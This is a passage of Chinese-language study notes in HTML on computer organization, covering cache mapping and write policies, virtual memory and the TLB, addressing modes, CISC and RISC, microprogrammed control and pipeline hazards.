id="②地址映射"><a href="#②地址映射" class="headerlink" title="②地址映射"></a>②地址映射</h5><h6 id="全相联映射"><a href="#全相联映射" class="headerlink" title="全相联映射"></a>全相联映射</h6><p><strong>定义</strong>：主存中的每一个数据块都可以放置到cache的任意一个数据块中，是一对多的映射关系。只有cache满时才需要进行数据块置换。</p><p><strong>优点</strong>：cache利用率最高，冲突概率最低</p><p><strong>缺点</strong>：比较电路复杂，查找成本较高，需要CAM提供快速的查找空能。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620172521363.png" alt="image-20220620172521363"></p><p>将地址分为两部分（块号和字），在内存块写入Cache时，同时写入块号标记；<br>CPU给出访问地址后，也将地址分为两部分（块号和字），比较电路将块号与Cache 表中的标记进行比较，相同表示命中，访问相应单元；如果没有命中访问内存，CPU 直接访问内存，并将被访问内存的相对应块写入Cache。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620173330505.png" alt="image-20220620173330505"></p><h6 id="直接相连映射"><a href="#直接相连映射" class="headerlink" title="直接相连映射"></a>直接相连映射</h6><p><strong>定义</strong>：主存中的每一块只能被放置到Cache中唯一的一个位置。(循环分配)</p><p><strong>优点</strong>：标志位较短，比较电路的成本低。</p><p><strong>缺点</strong>：利用率低，命中率低，效率较低</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620173210336.png" alt="image-20220620173210336"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620173344514.png" alt="image-20220620173344514"></p><h6 id="x3D-x3D-组相联映射-x3D-x3D"><a href="#x3D-x3D-组相联映射-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;组相联映射&#x3D;&#x3D;"></a>&#x3D;&#x3D;组相联映射&#x3D;&#x3D;</h6><p><strong>定义</strong>：主存中的每一块可以被放置到Cache中唯一的一个组中的任何一个位置。</p><p>组相联映射将cache分成固定大小的组，每组有k行，称为k-路组相联；主存数据块首先采用直接相联映射的方式定位到cache中固定的组，然后采用全相联映射的方式映射到组内任何一个cache行</p><p>cache组号&#x3D;主存块号 mod（cache组数）</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620180120618.png" alt="image-20220620180120618"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620180331448.png" alt="image-20220620180331448"></p><p><font size="5"><strong>不同映射方式主存地址划分</strong></font> </p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620212550612.png" alt="image-20220620212550612"></p><h5 id="③替换策略"><a href="#③替换策略" class="headerlink" title="③替换策略"></a>③替换策略</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620213346308.png" alt="image-20220620213346308"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620213356395.png" alt="image-20220620213356395"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220620213409397.png" alt="image-20220620213409397"></p><h5 id="④写入策略"><a href="#④写入策略" class="headerlink" title="④写入策略"></a>④写入策略</h5><h6 id="写回法"><a href="#写回法" class="headerlink" title="写回法"></a>写回法</h6><p><strong>定义</strong>：只修改cache的内容而不立即写入主存，只有当此行被替换出cache时才将脏数据写回主存。</p><p><strong>优点</strong>：可以显著减少写主存的次数</p><p><strong>缺点</strong>:cache与主存中数据的不一致性，每个cache行必须配置一个修改位</p><h6 id="写穿法"><a href="#写穿法" class="headerlink" title="写穿法"></a>写穿法</h6><p><strong>定义：</strong>同时对cache和主存中的同一数据块进行修改</p><p><strong>优点</strong>：无需设置一个修改位以及相应的的判别逻辑，被换处的数据库可以直接丢弃</p><p><strong>缺点</strong>：cache对CPU的写操作没有缓冲功能，降低了cache的功效</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621102826883.png" alt="image-20220621102826883"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image20220621100327.jpg" alt="image20220621100327"></p><h4 id="5、虚拟存储器"><a href="#5、虚拟存储器" class="headerlink" title="5、虚拟存储器"></a>5、虚拟存储器</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p><strong>定义</strong>：虚拟存储器是建立在<strong>主存与辅存物理结构基础</strong>之上，由附加硬件装置以及操作系统存储管理软件组成的一种存储体系</p><p><strong>物理地址VA</strong>（Virtual Addresses）：CPU地址引脚送出，用于访问主存的地址。</p><p><strong>虚拟地址PA</strong>（Physical Addresses）：编译程序生成的，是程序的<strong>逻辑地址</strong>，其地址空间的大小受到辅助存储器容量的限制。</p><p><strong>MMU</strong>（Memory Management Unit）：存放虚拟地址与物理地址的对应关系，并判断这个虚拟地址对应的内容是否已经在主存中。<u>如果已经在主存中</u>，则通过MMU将虚拟地址转换成物理地址，CPU直接访问主存单元；<u>如果不在主存中</u>，则把包含这个字的一页或一个程序段调入主存，并在MMU中填写相关的标记信息。</p><p><strong>页表</strong>：<strong>页表常驻内存</strong>，每个进程都拥有独立的虚拟地址空间，每个进程都有一张完整的页表，页表属于进程控制信息</p><p><strong>PTE</strong>（Page Table Entry）：页表项（PPN）</p><p><strong>PTEA</strong>（Page Table Entry Addresses）：页表项地址</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621105217343.png" alt="image-20220621105217343"></p><p><strong>VPN</strong>（Virtual Page Number）：虚拟页号</p><p><strong>PPN</strong>（Physical Page Number）：物理页号</p><p><strong>VPO</strong>（Virtual Page Offset）：虚拟页偏移</p><p><strong>PPO</strong>（Physical Page Offset）:物理页偏移</p><p>VPO 和 PPO 的位数决定了<strong>页面大小</strong>，因为物理页和虚拟页大小相同，所以 VPO 和PPO 的位数相同</p><p>VPN 和PPN 的位宽则分别取决于<strong>虚拟空间的容量</strong>和<strong>主存空间的容量。</strong></p><h5 id="虚拟地址与物理地址转换过程"><a href="#虚拟地址与物理地址转换过程" class="headerlink" title="虚拟地址与物理地址转换过程"></a>虚拟地址与物理地址转换过程</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621105835779.png" alt="image-20220621105835779"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621111707965.png" alt="image-20220621111707965"></p><h5 id="结合cache的虚拟存储器访问流程"><a href="#结合cache的虚拟存储器访问流程" class="headerlink" title="结合cache的虚拟存储器访问流程"></a>结合cache的虚拟存储器访问流程</h5><p>cache会缓存主存中经常访问的数据，因此页表的部分数据块也会作为常用的热数据调度到cache中。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621112237171.png" alt="image-20220621112237171"></p><h5 id="x3D-x3D-利用TLB加速虚拟存储器地址转换-x3D-x3D"><a href="#x3D-x3D-利用TLB加速虚拟存储器地址转换-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;利用TLB加速虚拟存储器地址转换&#x3D;&#x3D;"></a>&#x3D;&#x3D;利用TLB加速虚拟存储器地址转换&#x3D;&#x3D;</h5><p>现代处理器都维护着一个转换旁路缓冲区( Translation Look-aside Buffer，TLB ),用于缓冲经常访问的页表项PTE。TLB本质上就是一个容量较小的cache，为提高查找速度，大多采用<strong>全相联或组相联方式</strong>，且采用<strong>随机替换算法</strong></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621112557708.png" alt="image-20220621112557708"></p><p>TLB离CPU更近，访问速度更快，所以通常将TLB表称为快表，而将主存中的页表称为慢表。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/1655782115458.jpg" alt="1655782115458"></p><h3 id="第五章-指令系统"><a href="#第五章-指令系统" class="headerlink" title="第五章 指令系统"></a>第五章 指令系统</h3><h4 id="1、指令系统设计"><a href="#1、指令系统设计" class="headerlink" title="1、指令系统设计"></a>1、指令系统设计</h4><h5 id="一条指令须明显或隐含包含的信息"><a href="#一条指令须明显或隐含包含的信息" class="headerlink" title="一条指令须明显或隐含包含的信息"></a>一条指令须明显或隐含包含的信息</h5><p><strong>操作码</strong>：指定操作类型<br>   (操作码长度：固定／可变)</p><p><strong>源操作数参照</strong>：一个或多个源操作数或所在的地址<br>   (操作数来源：主(虚)存&#x2F;寄存器&#x2F;I&#x2F;O端口&#x2F;指令本身）</p><p><strong>结果值参照</strong>：产生的结果存放何处（目的操作数）<br>   (结果地址：主(虚)存&#x2F;寄存器&#x2F;I&#x2F;O端口)</p><p><strong>下一条指令地址</strong>：下条指令存放何处<br>   (下条指令地址 ：主(虚)存)<br>   (正常情况隐含在PC中，改变顺序时由指令给出）</p><h5 id="x3D-x3D-寻址方式-x3D-x3D"><a href="#x3D-x3D-寻址方式-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;寻址方式&#x3D;&#x3D;"></a>&#x3D;&#x3D;寻址方式&#x3D;&#x3D;</h5><p><strong>指令寻址方式</strong>：顺序寻址，跳跃寻址</p><p>&#x3D;&#x3D;<strong>操作数寻址方式</strong>&#x3D;&#x3D;</p><p><strong>立即寻址</strong>：地址码字段是操作数本身</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121107777.png" alt="image-20220621121107777"></p><p><strong>寄存器寻址</strong>：操作数在CPU的内部寄存器中</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121131843.png" alt="image-20220621121131843"></p><p><strong>直接寻址</strong>：地址码字段直接给出操作数在内存的地址</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121205981.png" alt="image-20220621121205981"></p><p><strong>间接寻址</strong>：D单元的内容是操作数地址, D是操作数地址的地址</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121310081.png" alt="image-20220621121310081"></p><p><strong>寄存器间接寻址</strong>：D单元的内容是寄存器编号，以寄存器的内容为地址访问主存单元即可得到所需的操作数</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121637241.png" alt="image-20220621121637241"></p><p><strong>相对寻址</strong>：指令地址码给出一个偏移量(带符号数)，<strong>基准地址隐含由PC给出</strong>。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121828201.png" alt="image-20220621121828201"></p><p><strong>基址寻址</strong>：指令地址码给出一个<strong>偏移量</strong>，基准地址明显或隐含由基址寄存器B给出。</p><p>即：EA&#x3D;(B)+A   </p><p><strong>变址寻址</strong>：指令地址码给出一个<strong>基准地址</strong>，而偏移量(无符号数)明显或隐含由变址寄存器I 给出。</p><p>即：EA&#x3D;(I)+A</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621121943491.png" alt="image-20220621121943491"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220627225810542.png" alt="image-20220627225810542"></p><h6 id="x3D-x3D-例题-x3D-x3D"><a href="#x3D-x3D-例题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;例题&#x3D;&#x3D;"></a>&#x3D;&#x3D;例题&#x3D;&#x3D;</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621122525552.png" alt="image-20220621122525552"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621122543162.png" alt="image-20220621122543162"></p><h5 id="x3D-x3D-扩展（变长）操作码编码-x3D-x3D"><a href="#x3D-x3D-扩展（变长）操作码编码-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;扩展（变长）操作码编码&#x3D;&#x3D;"></a>&#x3D;&#x3D;扩展（变长）操作码编码&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621122647181.png" alt="image-20220621122647181"></p><p>解:操作码按短到长进行扩展编码<br>     二地址指令: (0000 ～ 1110)<br>     一地址指令: 11110 (00000 ～ 11111); 11111 (00000 ～ 00001)<br>     零地址指令: 11111 (00010 ～ 11111) (000000 ～ 111111)<br>     故零地址指令最多有 30x2^6^&#x3D;15x2^7^ 种</p><h5 id="指令设计风格"><a href="#指令设计风格" class="headerlink" title="指令设计风格"></a>指令设计风格</h5><h6 id="复杂指令集计算机CISC-Complex-Instruction-Set-Computer"><a href="#复杂指令集计算机CISC-Complex-Instruction-Set-Computer" class="headerlink" title="复杂指令集计算机CISC (Complex Instruction Set Computer)"></a>复杂指令集计算机CISC (Complex Instruction Set Computer)</h6><p>早期CISC设计风格的主要特点<br>(1) 指令系统复杂<br>     变长操作码 &#x2F; 变长指令字 &#x2F; 指令多 &#x2F; 寻址方式多 &#x2F; 指令格式多<br>(2) 指令周期长<br>      绝大多数指令需要多个时钟周期才能完成<br>(3) 各种指令都能访问存储器<br>      除了专门的存储器读写指令外，运算指令也能访问存储器<br> (4) 采用微程序控制<br> (5) 有专用寄存器<br> (6) 难以进行编译优化来生成高效目标代码</p><h6 id="精简指令集计算机RISC-Reduce-Instruction-Set-Computer"><a href="#精简指令集计算机RISC-Reduce-Instruction-Set-Computer" class="headerlink" title="精简指令集计算机RISC (Reduce Instruction Set Computer)"></a>精简指令集计算机RISC (Reduce Instruction Set Computer)</h6><p>(1) 简化的指令系统<br>     指令少 &#x2F; 寻址方式少 &#x2F; 指令格式少 &#x2F; 指令长度一致<br>(2) 以RR方式工作<br>      除Load&#x2F;Store指令可访问存储器外，其余指令都只访问寄存器。<br>(3) 指令周期短<br>   以流水线方式工作， 因而除Load&#x2F;Store指令外，其他简单指令都只需一个或一个不到的时钟周期就可完成。<br> (4) 采用大量通用寄存器，以减少访存次数<br> (5) 采用组合逻辑电路控制，不用或少用微程序控制<br> (6)  采用优化的编译系统，力求有效地支持高级语言程序</p><h4 id="2、程序的机器级表示"><a href="#2、程序的机器级表示" class="headerlink" title="2、程序的机器级表示"></a>2、程序的机器级表示</h4><h5 id="MIPS概述"><a href="#MIPS概述" class="headerlink" title="MIPS概述"></a>MIPS概述</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621125104615.png" alt="image-20220621125104615"></p><h6 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220621125951532.png" alt="image-20220621125951532"></p><h6 id="操作指令"><a href="#操作指令" class="headerlink" title="操作指令"></a>操作指令</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image20220621130010.jpg" alt="image20220621130010"></p><h3 id="第六章-中央处理器"><a href="#第六章-中央处理器" class="headerlink" title="第六章  中央处理器"></a>第六章  中央处理器</h3><h4 id="1、中央处理器概述"><a href="#1、中央处理器概述" class="headerlink" title="1、中央处理器概述"></a>1、中央处理器概述</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622104938506.png" alt="image-20220622104938506"></p><p><strong>操作控制器主要功能</strong>： 循环取指、执行、处理异常</p><p>将<strong>机器指令译码</strong>并生成<strong>执行部件</strong>所需的<strong>控制信号序列</strong> ，控制信号按序送至各执行部件控点，引起逻辑门开闭，建立正确的<strong>数据通路</strong>，从而完成指令功能。</p><p><strong>控制器分类</strong></p><p>硬布线控制器   (时序逻辑型)  (硬件实现)</p><p>微程序控制器   (存储程序型)  (软件实现)</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622111201779.png" alt="image-20220622111201779"></p><h4 id="2、指令周期"><a href="#2、指令周期" class="headerlink" title="2、指令周期"></a>2、指令周期</h4><p><strong>时钟周期</strong> &#x3D; 节拍脉冲 &#x3D; 震荡周期                                    能完成一次<strong>微操作</strong></p><p><strong>机器周期</strong> &#x3D; CPU周期   从主存读出一条指令的<strong>最短时间</strong>    可完成    <strong>复杂操作</strong></p><p><strong>指令周期</strong>：从主存取一条指令并执行指令的时间</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622105653712.png" alt="image-20220622105653712"></p><p><strong>定长指令周期</strong>：    传统三级时序系统</p><p>​机器周期数<strong>固定</strong>，节拍数<strong>固定</strong>，按<u><strong>机器周期同步</strong></u>，mips单周期</p><p><strong>变长指令周期</strong>：    现代时序系统</p><p>​机器周期数<strong>可变</strong>，节拍数<strong>可变</strong>，按<u><strong>时钟周期同步</strong></u>，mips多周期</p><p>​定长指令周期只是一种特例</p><h4 id="3、数据通路及指令操作流程"><a href="#3、数据通路及指令操作流程" class="headerlink" title="3、数据通路及指令操作流程"></a>3、数据通路及指令操作流程</h4><p><strong>数据通路</strong>——执行部件间传送信息的路径        (数据流)</p><p>通路的建立由<strong>控制信号控制</strong>，受<strong>时钟驱动</strong>   （控制流）</p><p><strong>分类</strong>：</p><ul><li>共享通路（总线）<ul><li>主要部件都连接在公共总线上，各部件间通过总线进行数据传输</li><li>结构简单，实现容易，但<strong>并发性较差</strong>，需分时使用总线，<strong>效率低</strong></li></ul></li><li>专用通路<ul><li>并发度高，性能佳，设计复杂，成本高</li><li>可以看作多总线结构</li></ul></li></ul><p><strong>数据通路定义</strong>：数据通路是由<strong>操作元件</strong>和<strong>存储元件</strong>通过<strong>总线方式</strong>或<strong>分散方式</strong>连接而成的进行<strong>数据存储、处理、传送</strong>的路径。</p><h5 id="x3D-x3D-单总线结构MIPC-CPU-典型指令-x3D-x3D"><a href="#x3D-x3D-单总线结构MIPC-CPU-典型指令-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;单总线结构MIPC CPU 典型指令&#x3D;&#x3D;"></a>&#x3D;&#x3D;单总线结构MIPC CPU 典型指令&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622112238032.png" alt="image-20220622112238032"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622112732969.png" alt="image-20220622112732969"></p><h4 id="4、时序与控制"><a href="#4、时序与控制" class="headerlink" title="4、时序与控制"></a>4、时序与控制</h4><h5 id="x3D-x3D-单总线结构CPU指令周期-x3D-x3D"><a href="#x3D-x3D-单总线结构CPU指令周期-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;单总线结构CPU指令周期&#x3D;&#x3D;"></a>&#x3D;&#x3D;单总线结构CPU指令周期&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622113506487.png" alt="image-20220622113506487"></p><h5 id="控制方式"><a href="#控制方式" class="headerlink" title="控制方式"></a>控制方式</h5><ul><li><strong>同步控制</strong><ul><li>机器周期数、节拍数固定        3机器周期*4节拍</li><li>机器周期数固定，节拍数不固定     3机器周期，取指&#x2F;计算&#x2F;执行 4&#x2F;2&#x2F;3节拍</li><li>大多数指令机器周期固定                   机器周期，节拍数按需分派</li></ul></li><li>异步控制<ul><li>无时钟，应答机制</li></ul></li><li>联合控制<ul><li>同步、异步相结合</li></ul></li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622114240447.png" alt="image-20220622114240447"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622114251491.png" alt="image-20220622114251491"></p><h5 id="时序发生器"><a href="#时序发生器" class="headerlink" title="时序发生器"></a>时序发生器</h5><p><strong>循环产生</strong>周期电位、节拍电位，供控制器对信号进行时间调制</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622114419589.png" alt="image-20220622114419589"></p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220622114433801.png" alt="image-20220622114433801"></p><h4 id="5、硬布线控制器"><a href="#5、硬布线控制器" class="headerlink" title="5、硬布线控制器"></a>5、硬布线控制器</h4><h4 id="6、微程序控制器"><a href="#6、微程序控制器" class="headerlink" title="6、微程序控制器"></a>6、微程序控制器</h4><ul><li>控制信号序列像程序一样存储起来<ul><li>控制信号序列分解为若干节拍</li><li>一个节拍的并发信号编成一条微指令</li><li>多个节拍对应多条微指令，形成一段微程序依序</li></ul></li><li>执行微程序即可生成控制信号序列<ul><li>指令取指执行 → 微程序执行 → 微指令执行 →  生成控制信号</li><li>软时序：依次执行微指令，时间信号有先后顺序</li></ul></li></ul><h6 id="微程序-微指令-微命令-微操作的关系"><a href="#微程序-微指令-微命令-微操作的关系" class="headerlink" title="微程序\微指令\微命令\微操作的关系"></a>微程序\微指令\微命令\微操作的关系</h6><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220624171615723.png" alt="image-20220624171615723"></p><p>一条微指令对应一个时钟周期</p><h6 id="下条微指令地址的确定方式"><a href="#下条微指令地址的确定方式" class="headerlink" title="下条微指令地址的确定方式"></a>下条微指令地址的确定方式</h6><ul><li><p>怎样控制微程序的执行顺序？</p><ul><li>通过在本条微指令中明显或隐含地指定下条微指令在控存中的地址来控制。</li></ul></li><li><p>微指令地址的产生方法有两种：</p><ul><li>增量(<strong>计数器</strong>)法：下条微指令地址隐含在微程序计数器μPC中。</li><li>断定(<strong>下址字段</strong>)法：在本条微指令中明显指定下条微指令地址。</li></ul></li><li><p>选择下条要执行的微指令有以下四种情况：</p><ul><li>取指微程序首址：每条指令执行前，CPU先执行取指微程序。</li><li>第一条微指令：每条指令取出后，必须转移到该指令对应的第一条微指令执行。</li><li>顺序执行时：微程序执行过程中顺序取出下条微指令执行。</li><li>分支执行时：在遇到按条件转移到不同微指令执行时，需要根据控制单元的输入来选择下条微指令。</li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220625141423601.png" alt="image-20220625141423601"></p><p>eg.</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220625145114481.png" alt="image-20220625145114481"></p></li></ul><h6 id="微指令格式的设计"><a href="#微指令格式的设计" class="headerlink" title="微指令格式的设计"></a>微指令格式的设计</h6><ul><li><p>水平型微指令</p><ul><li><p>特点：</p><ul><li>并行操作能力强，效率高，执行时间短、灵活性强</li><li>微指令字较长，微程序短，控存容量大，性能佳</li><li>微操作码编码方式：</li></ul></li><li><p>微操作码编码方式：</p><ul><li>不译法（直接控制法）  </li><li>字段直接编码（译）法  </li><li>字段间接编码（译）法</li></ul></li></ul></li><li><p>垂直型微指令</p><ul><li><p>特点：</p><ul><li>字长短，微程序长，控存容量小，性能差</li><li>垂直型与指令相似，易于掌握</li><li>基本被淘汰</li></ul></li><li><p>微操作码编码方式：</p><ul><li>最小（最短、垂直）编码（译）法</li></ul></li></ul></li></ul><h4 id="7、异常与中断处理"><a href="#7、异常与中断处理" class="headerlink" title="7、异常与中断处理"></a>7、异常与中断处理</h4><ul><li>内部异常<ul><li>故障（Fault）<ul><li>由指令执行引起的异常，如未定义指令、越权指令、段故障、缺页故障、存储保护违例、数据未对齐、除数为零、浮点溢出、整数溢出等。</li><li>可恢复的故障，指令需恢复执行，不可恢复故障，进程被终止</li></ul></li><li>自陷（ trap）<ul><li>是一种事先安排的“异常”事件，通过在程序中显式的调用自陷指令触发自陷异常，用于在用户态下调用操作系统内核程序，如系统调用、条件陷阱指令。</li></ul></li><li>终止（Abort）<ul><li>随机出现的使得 CPU 无法继续执行的硬件故障，和具体指令无关。如机器校验错、总线错误、异常处理中再次异常的双错等，此时当前程序无法继续执行，只能终止执行，由异常服务处理程序来重启系统</li></ul></li></ul></li><li>外部中断</li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220625161837447.png" alt="image-20220625161837447"></p><h3 id="第七章-指令流水线"><a href="#第七章-指令流水线" class="headerlink" title="第七章 指令流水线"></a>第七章 指令流水线</h3><h4 id="7-1-流水线概述"><a href="#7-1-流水线概述" class="headerlink" title="7.1 流水线概述"></a>7.1 流水线概述</h4><p>单周期完成n条指令需要  <strong>5nT</strong></p><p>指令流水线完成n条指令的时间&#x3D;完成第一条指令时间 <strong>5T+(n-1) * T&#x3D;(n+4)T</strong> </p><h4 id="7-2-流水线数据通路"><a href="#7-2-流水线数据通路" class="headerlink" title="7.2 流水线数据通路"></a>7.2 流水线数据通路</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86.assets/image-20220626101834605.png" alt="image-20220626101834605"></p><h4 id="7-3-流水线冲突与处理"><a href="#7-3-流水线冲突与处理" class="headerlink" title="7.3 流水线冲突与处理"></a>7.3 流水线冲突与处理</h4><h5 id="x3D-x3D-指令流水线的冲突、相关、冒险（hazard）-x3D-x3D"><a href="#x3D-x3D-指令流水线的冲突、相关、冒险（hazard）-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;指令流水线的冲突、相关、冒险（hazard）&#x3D;&#x3D;"></a>&#x3D;&#x3D;指令流水线的冲突、相关、冒险（hazard）&#x3D;&#x3D;</h5><ul><li>结构冲突<ul><li><strong>争用主存</strong>：IF段取指令、ID段取操作数</li><li><strong>争用ALU</strong>：多周期方案中计算PC、分支地址，运算指令 </li><li><strong>解决方案</strong>：<strong>增加部件消除</strong></li></ul></li><li>控制冲突<ul><li>提前取出的指令作废，流水线清空</li><li>流水线发生中断</li></ul></li><li>数据冲突<ul><li>指令操作数依赖于前一条指令的执行结果       ADD $s1, $s2, $s3</li><li>引起流水线停顿直到数据写回                        ADD $s4, $s1, $s3</li></ul></li></ul><h5 id="控制冲突总结"><a href="#控制冲突总结" class="headerlink" title="控制冲突总结"></a>控制冲突总结</h5><ul><li><strong>指令跳转</strong><ul><li>IF段重新取新的指令</li></ul></li><li><strong>清除误取指令</strong><ul><li>IF&#x2F;ID、ID&#x2F;EX段给出同步清零信号</li></ul></li><li><strong>分支指令执行阶段</strong>？<ul><li>越早执行，性能损失越小</li><li>MIPS中通常为ID段执行，为了简化中断，重定向机制，可在EX段执行</li></ul></li><li><strong>分支延迟槽技术</strong><ul><li>配合ID段执行分支指令，彻底消除分支带来的流水性能损失</li><li>如何将有用的指令载入延迟槽比较关键</li><li>X86中没有分支延迟槽，采用动态分支预测技术</li></ul></li></ul><h5 id="数据相关处理机制"><a href="#数据相关处理机制" class="headerlink" 